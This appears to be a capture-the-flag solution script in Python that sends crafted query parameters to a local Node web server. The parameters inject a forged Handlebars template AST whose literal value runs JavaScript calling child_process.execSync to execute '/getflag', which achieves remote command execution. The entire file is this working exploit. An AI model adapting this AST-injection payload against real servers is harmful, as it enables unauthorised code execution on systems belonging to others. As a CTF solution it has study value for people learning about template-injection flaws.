#!/usr/bin/env python

# Credit to @to.do for this solution

import requests

TARGET = "http://localhost:8000/"

print(requests.get(TARGET, params={
    "x[type]": "Program",
    "x[body][0][type]": "MustacheStatement",
    "x[body][0][path]": "0",
    "x[body][0][loc][start]": "0",
    "x[body][0][loc][end]": "0",
    "x[body][0][params][0][type]": "NumberLiteral",
    "x[body][0][params][0][value]": "function () {throw new Error(process.mainModule.require('child_process').execSync('/getflag').toString())}()"
}).text)
